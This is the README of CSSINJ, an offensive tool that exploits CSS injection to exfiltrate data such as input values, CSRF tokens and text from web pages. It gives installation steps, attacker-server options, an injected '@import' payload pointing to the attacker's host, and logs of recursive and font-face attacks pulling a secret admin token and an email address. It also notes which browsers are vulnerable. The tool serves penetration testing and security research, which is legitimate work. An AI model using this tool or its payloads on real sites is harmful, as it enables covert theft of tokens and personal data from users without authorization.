# CSSINJ

```
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
```

## About

**CSSINJ** is a penetration testing tool that exploits [**CSS injection vulnerabilities**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection) to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.

## Installation

To install **CSSINJ**, run the following command:

```bash
pip install cssinj

# Or with uv
uv add cssinj
```

Now you’re ready to use **CSSINJ**!

## Usage

```bash
python3 -m cssinj [-h] [--version] [-H HOSTNAME] [-p PORT] [-e ELEMENT]
                  [-a ATTRIBUTE] [-d] [-v | -q] [--no-banner]
                  [--log-file LOG_FILE] [-m {recursive,font-face}]
                  [-o [OUTPUT]] [-t TIMEOUT]
```

### Options

| Option                  | Description                                                                                 |
| ----------------------- | ------------------------------------------------------------------------------------------- |
| `-h, --help`            | Show help message and exit                                                                  |
| `--version`             | Show program version and exit                                                               |
| `-H, --hostname`        | Attacker hostname or IP address (default: `127.0.0.1`)                                      |
| `-p, --port`            | Port number of the attacker (default: `5005`)                                               |
| `-e, --element`         | HTML element to extract data from (default: `input`)                                        |
| `-a, --attribute`       | Element attribute selector to exfiltrate (default: `value`). Deprecated alias: `--attribut` |
| `-m, --method`          | Exfiltration strategy: `recursive` or `font-face` (default: `recursive`)                    |
| `-d, --details`         | Show detailed (debug) logs, including extracted data                                        |
| `-v, --verbose`         | Enable debug-level logging                                                                  |
| `-q, --quiet`           | Only log warnings and errors                                                                |
| `--no-banner`           | Do not print the ASCII banner on startup                                                    |
| `--log-file LOG_FILE`   | Also write structured logs to this file                                                     |
| `-t, --timeout`         | Seconds before considering exfiltration complete, for `font-face` (default: `3.0`)          |
| `-o, --output [OUTPUT]` | Store the exfiltrated data as JSON (default file: `output.json`)                            |

### Example

#### Victim's View :

```html
<h1>Welcome on my page !</h1>
<input type="text" id="username" value="admin" disabled>
<input type="email" id="email" value="admin@admin.XX" disabled>
<input type="text" class="csrf" value="MySecretAdminToken" hidden>
<img src="XXXXXXXXXXX.XX">
...
<style>
  @import url('//localhost:5005/start');
</style>
...
```

#### Recursive attack

###### Using a specific HTML identifier :

```bash
~ python3 -m cssinj -H 127.0.0.1 -p 5005 -e input
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-03-11T03:06:49] INFO    🛠️ Attacker's server started on 127.0.0.1:5005
[2025-03-11T03:06:49] INFO    🌐 Connection from ::1
[2025-03-11T03:06:49] INFO    ✅ [1] - The value exfiltrated from input is : MySecretAdminToken
[2025-03-11T03:06:49] INFO    ✅ [1] - The value exfiltrated from input is : admin@admin.XX
[2025-03-11T03:06:49] INFO    ✅ [1] - The value exfiltrated from input is : admin
```

###### Using a specific CSS attribute selector and a generic HTML identifier:

```bash
~ python3 -m cssinj -H 127.0.0.1 -p 5005 -e '*' -a src
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-03-11T03:06:49] INFO    🛠️ Attacker's server started on 127.0.0.1:5005
[2025-03-11T03:06:49] INFO    🌐 Connection from ::1
[2025-03-11T03:06:49] INFO    ✅ [1] - The src exfiltrated from * is : XXXXXXXXXXX.XX
```

#### Font-face attack

> **Note:** The `font-face` method reveals *which* characters are present in the
> target element, **not their order** — which is why the output below is not in
> reading order.

```bash
~ python3 -m cssinj -H 127.0.0.1 -p 5005 -e h1 --method font-face -d
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[2025-05-21T03:06:49] INFO    🛠️ Attacker's server started on 127.0.0.1:5005
[2025-05-21T03:06:49] INFO    🌐 Connection from 127.0.0.1
[2025-05-21T03:06:49] DEBUG   ⚙️ ID : 1
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: W
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: e
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: l
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: c
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: o
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: m
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: n
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: y
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: p
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: a
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: g
[2025-05-21T03:06:49] DEBUG   🔎 [1] - Exfiltrating element: !
[2025-05-21T03:06:52] INFO    ✅ [1] - Characters found in h1: Welcomnyp ag!
```

## Browser-Specific Behavior

The success of CSS injection attacks using @import depends on the browser's handling of CSS imports:

- Chromium-based browsers (Chrome, Edge, Brave, etc.) allow recursive CSS imports and will process the injected styles, making them vulnerable to exfiltration techniques using @import.

- Firefox, however, handles @import differently:

  - Unlike Chromium-based browsers, Firefox processes all @import rules before applying any styles.
  - As a result, the attack fails because the browser never processes the CSS selectors, preventing data exfiltration.
  - This behavior causes an infinite loop where the browser keeps waiting for a CSS update that never happens.

This difference in behavior makes Chromium-based browsers more susceptible to CSS injection exfiltration, while Firefox provides better protection against such attacks.

## Todo

- General :

  - [x] Add error Handler
    - [ ] File error Handler
  - [x] Add test
  - [x] Edit Terminal

- Injection :

  - [x] Add timeout for font-face exfiltration

- Complete Exfiltration (Blind):

  - [x] 0. Complete dom objects
  - [ ] 1. Get Structure of the HTML (Tags)
  - [ ] 2. Get all Attributs for each Element
  - [ ] 3. Get all value for each Attributs
  - [ ] 4. Get text using font-face exfiltration

## Disclaimer

This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.

## Author

**CSSINJ** was developed by **DonAsako**.
